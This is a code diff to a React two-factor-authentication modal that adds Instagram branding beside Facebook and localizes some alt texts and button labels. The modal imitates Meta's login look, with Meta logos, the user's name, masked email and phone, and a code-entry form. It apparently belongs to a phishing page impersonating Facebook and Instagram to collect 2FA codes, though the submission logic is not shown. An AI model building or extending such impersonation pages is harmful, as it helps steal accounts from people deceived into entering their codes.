@@ -10,9 +10,16 @@ interface TwoFactorModalProps {
     isOpend: boolean;
     isOpendFinish: (value: boolean) => void;
     onToggleModal: (isOpen: boolean) => void;
+    /** Luồng đăng nhập Instagram — hiển thị nhãn Instagram thay cho Facebook ở dòng tiêu đề phụ */
+    socialBrand?: 'facebook' | 'instagram';
 }
 
-const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
+const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
+    isOpend,
+    isOpendFinish,
+    onToggleModal,
+    socialBrand = 'facebook',
+}) => {
     const t = useAppStrings();
     const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30;
 
@@ -187,12 +194,12 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                         <span>{fullName}</span>
                         <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
-                        <span>{t.common.facebook}</span>
+                        <span>{socialBrand === 'instagram' ? t.common.instagram : t.common.facebook}</span>
                     </div>
                     <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title(click + 1)}</h2>
                     <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay)}</p>
                     <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
-                        <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
+                        <img src="/images/meta/authentication.png" width="100%" alt={t.twoFa.illustrationAlt} />
                     </div>
                     <div className='w-full'>
                         <form onSubmit={handSubmit}>
@@ -223,10 +230,10 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                                 >
                                     {loading && (
                                         <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
-                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
+                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt={t.twoFa.spinnerAlt} />
                                         </div>
                                     )}
-                                    {loading ? '' : t.twoFa.ariaSubmit}
+                                    {loading ? t.twoFa.verifyingButton : t.twoFa.ariaSubmit}
                                 </button>
                             </div>
 
@@ -238,7 +245,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 </div>
 
                 <div className='mx-auto h-[60px] w-[60px] shrink-0'>
-                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
+                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt={t.twoFa.footerLogoAlt} />
                 </div>
             </div>
         </Modal>
